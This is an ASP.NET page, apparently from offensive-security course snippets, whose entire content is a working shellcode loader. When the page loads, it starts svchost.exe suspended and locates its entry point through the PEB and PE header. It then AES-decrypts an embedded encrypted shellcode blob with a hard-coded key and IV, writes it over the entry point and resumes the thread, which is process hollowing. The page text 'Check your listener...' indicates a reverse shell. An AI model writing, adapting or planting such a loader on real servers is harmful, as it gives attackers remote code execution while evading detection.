<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Threading.Tasks" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<script runat="server">
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [System.Runtime.InteropServices.DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

    private byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (var aes = Aes.Create())
        {
            aes.KeySize = 256;
            aes.BlockSize = 128;

            // Keep this in mind when you view your decrypted content as the size will likely be different.
            aes.Padding = PaddingMode.Zeros;

            aes.Key = key;
            aes.IV = iv;

            using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            {
                return PerformCryptography(data, decryptor);
            }
        }
    }

    private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
    {
        using (var ms = new MemoryStream())
        using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
            cryptoStream.FlushFinalBlock();
            return ms.ToArray();
        }
    }

    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
            return;
        }
        
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        // Created a suspended process
        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
        IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

        // Fetch PEB address
        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

        // Fetch the PE header
        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

        // Parse the PE header to locate the EntryPoint of our process
        byte[] data = new byte[0x200];
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
        uint opthdr = e_lfanew_offset + 0x28;
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

        // Encrypted shellcode, Generated with \OSEP-Code-Snippets-main\OSEP-Code-Snippets-main\AES-Shellcode\AES-Shellcode\bin\x64\Release\AES-Shellcode.exe
        byte[] Enc = new byte[768] {
        0xa3, 0xe6, 0x13, 0xef, 0x29, 0x55, 0x4a, 0xb4, 0xa9, 0xc3, 0x89, 0x3b, 0xc9, 0x3e, 0x03,
        0x15, 0x86, 0xe3, 0x66, 0x83, 0x7c, 0x93, 0x05, 0x67, 0x4b, 0xca, 0x3a, 0xb0, 0xeb, 0x69,
        0x0a, 0xba, 0x46, 0xcb, 0x91, 0xf6, 0x1d, 0xfc, 0x55, 0xa0, 0xaf, 0xb9, 0xad, 0x3b, 0x09,
        0xed, 0xb5, 0x89, 0x8b, 0xbe, 0x0d, 0x51, 0x1a, 0xa8, 0x8d, 0x8e, 0x57, 0xfe, 0xf5, 0x91,
        0xb6, 0xf1, 0xc9, 0xf1, 0x1c, 0x22, 0xb4, 0x13, 0xc4, 0xe5, 0xb4, 0xf6, 0xef, 0x5d, 0x42,
        0x38, 0x5f, 0x8c, 0x70, 0x2a, 0xf0, 0xf5, 0x76, 0xbf, 0xbf, 0xf4, 0x9a, 0xfa, 0xd6, 0x0a,
        0x6e, 0x0a, 0x75, 0xd4, 0x9d, 0x55, 0xd6, 0x1d, 0xd4, 0xbf, 0xf2, 0x20, 0xcf, 0x55, 0xed,
        0xfa, 0xb3, 0xb7, 0xee, 0x0a, 0x7b, 0x03, 0xc8, 0xcb, 0x9a, 0xf9, 0xe3, 0x1e, 0x7c, 0x51,
        0xff, 0x78, 0xd7, 0xd6, 0x66, 0x84, 0x2e, 0xa2, 0x12, 0x39, 0x3a, 0xac, 0x51, 0x7f, 0xd0,
        0x70, 0x21, 0x84, 0xd7, 0xfc, 0x44, 0xa8, 0xbc, 0x95, 0x9f, 0x11, 0xf6, 0x3f, 0x85, 0xc2,
        0xc1, 0x45, 0x85, 0xe8, 0x2a, 0x52, 0x6d, 0x4b, 0xc9, 0xd9, 0x1e, 0x14, 0xc2, 0xf6, 0x5f,
        0x08, 0x22, 0xa8, 0xd0, 0xf2, 0x50, 0xec, 0xd9, 0x80, 0x05, 0x13, 0xdc, 0x80, 0xa5, 0x50,
        0x52, 0xa6, 0xd5, 0x33, 0x2d, 0x70, 0x05, 0xa0, 0x23, 0xc4, 0x6b, 0x3d, 0xc1, 0x7a, 0xaa,
        0x33, 0x4b, 0x7c, 0x40, 0x31, 0xa8, 0x68, 0x1e, 0x1f, 0x2d, 0x9e, 0xee, 0x1b, 0x21, 0x60,
        0xf7, 0xe0, 0x2e, 0x2b, 0x24, 0xa4, 0xf5, 0xb9, 0x4f, 0x32, 0xdf, 0xea, 0x8e, 0xfa, 0x90,
        0x76, 0xab, 0x1b, 0xd8, 0xc9, 0x44, 0x07, 0x97, 0x3c, 0x94, 0x5d, 0x5c, 0x8e, 0xb8, 0x9c,
        0x21, 0xfb, 0x2c, 0xfe, 0x53, 0x6a, 0x0c, 0xde, 0x83, 0x84, 0x4d, 0x54, 0x91, 0x73, 0xbf,
        0xce, 0x31, 0xb1, 0x59, 0x32, 0xef, 0x10, 0x1d, 0x85, 0x6e, 0x7d, 0x07, 0x4f, 0xb3, 0x6c,
        0x19, 0x65, 0xf2, 0x93, 0x1f, 0x72, 0xf9, 0x08, 0xb6, 0x60, 0x34, 0x1a, 0x11, 0xb7, 0x18,
        0x52, 0x24, 0xba, 0x1c, 0x3b, 0x58, 0x5f, 0x7e, 0x7e, 0xb8, 0x95, 0x32, 0xeb, 0x1f, 0x70,
        0xda, 0xd8, 0xbd, 0x05, 0x9a, 0x68, 0xf4, 0xa1, 0xc7, 0xbc, 0xe0, 0x2b, 0xee, 0x9f, 0xcb,
        0xd2, 0x60, 0xc0, 0xff, 0x61, 0x05, 0x24, 0xae, 0x4c, 0x81, 0xd3, 0x26, 0x82, 0xa0, 0xee,
        0xdf, 0xbe, 0x2a, 0xed, 0x1f, 0xbf, 0x70, 0x8b, 0x93, 0x43, 0xc4, 0x2b, 0xd1, 0x51, 0xc1,
        0x43, 0xf5, 0x18, 0x21, 0xc3, 0xba, 0x54, 0x40, 0xc7, 0x51, 0x5f, 0xa6, 0x51, 0x84, 0xe0,
        0x25, 0x80, 0x7f, 0x33, 0xff, 0x9c, 0x3b, 0xb1, 0xd2, 0x10, 0x86, 0x70, 0x22, 0xb4, 0x7b,
        0x9e, 0xe1, 0x65, 0xaf, 0x8b, 0x18, 0xfa, 0xc6, 0x2b, 0xa3, 0xa5, 0x27, 0x57, 0x4c, 0x83,
        0x96, 0x67, 0xa3, 0xfd, 0xea, 0x89, 0x29, 0x1f, 0x1a, 0x8b, 0xba, 0xf8, 0x07, 0x74, 0x36,
        0x97, 0x2d, 0xb3, 0xa9, 0xac, 0x28, 0x5d, 0x93, 0x8f, 0x67, 0x89, 0x94, 0xe8, 0x19, 0xcb,
        0x9d, 0xb7, 0x65, 0x97, 0x95, 0x63, 0xe2, 0xec, 0x90, 0x6d, 0x4d, 0xad, 0x6e, 0x0a, 0xb7,
        0xd8, 0x32, 0x66, 0xc1, 0x77, 0x41, 0xde, 0x2a, 0x37, 0xd5, 0x40, 0xb4, 0xca, 0x4f, 0xea,
        0xf6, 0x30, 0x59, 0x61, 0xce, 0xac, 0x4e, 0x07, 0x21, 0x10, 0x4b, 0xab, 0x8f, 0x95, 0xf6,
        0x66, 0x75, 0x8d, 0x89, 0xb8, 0xfc, 0xf2, 0xae, 0x1b, 0x79, 0xbf, 0xa6, 0xf1, 0x83, 0x33,
        0x25, 0xb6, 0xd2, 0x86, 0xce, 0x63, 0x56, 0x21, 0xbb, 0xba, 0x88, 0xdf, 0xee, 0x65, 0xcb,
        0x6b, 0x33, 0xd9, 0xc4, 0x98, 0x67, 0x78, 0x78, 0x04, 0x95, 0xbf, 0x34, 0xf3, 0x3e, 0x07,
        0x51, 0x10, 0xd5, 0x13, 0x7d, 0x4d, 0x08, 0xa0, 0x92, 0x8c, 0xc6, 0x51, 0xc3, 0x01, 0x96,
        0x94, 0x4b, 0x52, 0x7b, 0xdf, 0xdf, 0x9f, 0x7b, 0x50, 0x87, 0x88, 0xd6, 0xd8, 0x88, 0x29,
        0x74, 0x46, 0x31, 0x64, 0x6d, 0x3a, 0xa5, 0xfe, 0xa1, 0x18, 0x1b, 0x7c, 0xb2, 0xaf, 0x0d,
        0x06, 0xd6, 0x86, 0x0f, 0x55, 0x2c, 0x48, 0x48, 0xc8, 0x30, 0x94, 0xcb, 0x38, 0x96, 0x98,
        0x78, 0x22, 0x08, 0xda, 0x7a, 0xe8, 0x4e, 0x57, 0x2f, 0x5e, 0xc6, 0x5a, 0xee, 0xd9, 0x16,
        0xf8, 0xa2, 0x4e, 0xb9, 0x66, 0x22, 0xa7, 0xdc, 0xb5, 0x62, 0xf4, 0x4d, 0x09, 0xa1, 0xf7,
        0xec, 0xcf, 0xe8, 0x4e, 0x01, 0x00, 0x79, 0x67, 0x7f, 0x27, 0x6f, 0xdc, 0x1f, 0xaf, 0xdd,
        0x63, 0x9f, 0x30, 0x90, 0xa9, 0x97, 0xf8, 0xde, 0x7e, 0x32, 0x58, 0x41, 0xb0, 0x72, 0x78,
        0x4f, 0x49, 0xb3, 0x2e, 0xcd, 0x32, 0x1f, 0x63, 0x83, 0x63, 0x5e, 0x4f, 0xce, 0x16, 0x59,
        0xb6, 0x27, 0xbb, 0xa2, 0xba, 0xf8, 0x9f, 0x7a, 0x3b, 0xcf, 0x8c, 0x61, 0x93, 0x9c, 0x40,
        0xcd, 0x59, 0xac, 0x8d, 0x65, 0xcc, 0xdc, 0x1c, 0x25, 0xdc, 0x5d, 0xe4, 0xf8, 0xde, 0xb4,
        0xe3, 0xe1, 0xc8, 0xe8, 0x7b, 0xb9, 0xa2, 0x61, 0x78, 0x30, 0x84, 0x3e, 0xaf, 0x94, 0x58,
        0xc6, 0x59, 0xb7, 0xb0, 0x53, 0x60, 0x2d, 0xb4, 0x3d, 0x8b, 0x7c, 0x5d, 0x3e, 0xa2, 0xb3,
        0x15, 0x3e, 0x9e, 0xe3, 0x5f, 0xec, 0x4a, 0x22, 0x46, 0xdc, 0xed, 0x9c, 0x25, 0xe4, 0xd5,
        0x1d, 0x49, 0x68, 0xda, 0x94, 0x6c, 0x5f, 0xcf, 0xba, 0x97, 0x65, 0x0a, 0x0e, 0x70, 0xd6,
        0xc7, 0x1f, 0x34, 0x4f, 0xc6, 0x50, 0xbb, 0x28, 0xd8, 0x92, 0x44, 0x7d, 0xc4, 0xba, 0xaf,
        0x63, 0x7c, 0x83, 0xe0, 0x6c, 0x5b, 0x61, 0x58, 0x41, 0x55, 0x94, 0xc9, 0xa3, 0xbc, 0xaa,
        0x17, 0x15, 0x51 };

        // Key 
        byte[] Key = new byte[32] {
        0xd4, 0x19, 0xc8, 0xca, 0x58, 0x67, 0x4b, 0xf5, 0x56, 0x61, 0x40, 0xb0, 0x35, 0x86, 0xeb,
        0xba, 0xc7, 0xdf, 0x8a, 0x71, 0xc0, 0x49, 0x26, 0x52, 0x46, 0x69, 0x0f, 0x48, 0x00, 0xb9,
        0x35, 0xfe };

        // IV 
        byte[] Iv = new byte[16] {
        0xb2, 0x72, 0x64, 0x23, 0x56, 0xcc, 0x8b, 0xb8, 0xdf, 0x1b, 0x84, 0x85, 0x59, 0xbe, 0xc2,
        0xb7 };

        // Decrypt our shellcode
        byte[] buf = Decrypt(Enc, Key, Iv);

        // Ovverwritiing the EntryPoint of our designated process with our decrypted shellcode
        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
        ResumeThread(pi.hThread);
    }
</script>
<!DOCTYPE html>
<html>
<body>
    <p>Check your listener...</p>
</body>
</html>